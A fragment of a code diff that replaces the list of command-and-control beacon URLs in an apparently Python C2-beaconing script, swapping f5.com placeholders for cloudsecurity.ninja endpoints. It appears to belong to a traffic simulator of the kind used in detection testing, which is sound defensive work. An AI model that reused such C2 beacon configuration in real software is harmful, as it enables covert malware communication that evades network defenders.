@@ -14,10 +14,10 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
 # C2 server URL (you can modify this to the actual server you're targeting)
 C2_SERVER_URL = [
-    "https://mycommand.f5.com/beacon",
-    "https://mocommand1.f5.com/beacon",
-    "https://mocommand2.f5.com/beacon",
-    "https://mocommand0.f5.com/beacon"
+    "https://1c27eace-eb71-4548-8e0d-0c711ce2c699.cloudsecurity.ninja/beacon",
+    "https://60bc6420-c2ef-49f0-86e1-8cea63070032.cloudsecurity.ninja/beacon",
+    "https://716316b6-6836-4bb5-8cab-c5c94236952e.cloudsecurity.ninja/beacon",
+    "https://www.cloudsecurity.ninja/beacon"
 ]
 
 # Payload to send
